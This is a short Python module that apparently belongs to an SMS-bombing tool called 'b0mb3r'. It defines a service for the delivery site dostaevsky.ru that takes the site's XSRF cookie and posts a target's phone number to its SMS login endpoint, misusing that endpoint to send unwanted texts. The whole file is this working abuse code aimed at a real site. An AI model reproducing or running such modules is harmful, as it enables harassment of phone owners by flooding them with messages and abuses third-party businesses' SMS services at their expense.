from b0mb3r.services.service import Service


class Dostaevsky(Service):
    phone_codes = [7]

    async def run(self):
        response = await self.get("https://dostaevsky.ru/")
        cookies = response.cookies

        await self.post(
            "https://dostaevsky.ru/auth/send-sms",
            data={"phone": self.format(self.formatted_phone, "* *** ***-**-**"), "_token": cookies["XSRF-TOKEN"]},
        )
